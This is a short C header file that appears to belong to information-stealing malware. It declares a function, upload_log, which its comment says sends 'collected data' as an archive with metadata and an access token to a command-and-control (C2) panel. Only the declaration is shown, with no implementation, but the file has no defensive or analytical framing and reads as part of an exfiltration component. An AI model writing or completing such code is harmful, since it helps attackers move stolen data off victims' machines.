#ifndef PANEL_HTTP_H
#define PANEL_HTTP_H

#include <stddef.h>

// Upload collected data to C2 panel
// Returns 0 on success, -1 on error
int upload_log(const char *c2_host, unsigned short c2_port,
               const char *token, const unsigned char *archive_data,
               size_t archive_len, const char *metadata);

#endif
